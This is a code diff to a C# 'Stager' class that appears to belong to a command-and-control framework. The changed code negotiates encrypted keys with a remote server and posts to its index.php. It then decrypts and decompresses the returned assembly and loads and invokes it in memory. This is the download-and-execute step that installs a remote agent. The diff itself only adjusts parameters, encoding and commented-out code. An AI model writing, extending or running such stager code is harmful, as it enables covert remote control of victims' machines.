@@ -14,8 +14,8 @@ namespace Stager
 {
     public class Stager
     {
-        public static void Run(string server,string sk) {
-            StartNegotiate(server, sk);
+        public static void Run(string server,string sk,string u) {
+            StartNegotiate(server, sk, u);
         }
 
         private static byte[] ConvertToRC4ByteStream(byte[] rck,byte[] input){
@@ -44,7 +44,6 @@ namespace Stager
         private static byte[] DecryptBytes(byte[] key, byte[] input) {
             if (input.Length > 32) {
                 HMACSHA256 hmac = new HMACSHA256();
-                Encoding e = Encoding.ASCII;
                 byte[] mac = input.Skip(input.Length - 10).ToArray();
                 byte[] tmp = input.Take(input.Length - 10).ToArray();
                 hmac.Key = key;
@@ -89,13 +88,6 @@ namespace Stager
             Random rd = new Random();
             ServicePointManager.Expect100Continue = false;
             byte[] skb = e.GetBytes(sk);
-            //try
-            //{
-            //    var aes = new System.Security.Cryptography.AesCryptoServiceProvider();
-            //}
-            //catch {
-            //    var aes = new System.Security.Cryptography.RijndaelManaged();
-            //}
             AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
             byte[] iv = new byte[16];
             rd.NextBytes(iv);
@@ -207,7 +199,7 @@ namespace Stager
             raw = wc.UploadData(s + "/index.php", "post", rc4p2);
             string decryptedAssembly = e.GetString(DecryptBytes(key, raw));
             Assembly agentAssembly = Assembly.Load(Decompress(Convert.FromBase64String(decryptedAssembly)));
-            agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { s, sk, key, Encoding.UTF8.GetString(id) });
+            agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { s, sk, key, e.GetString(id) });
             GC.Collect();
         }
     }
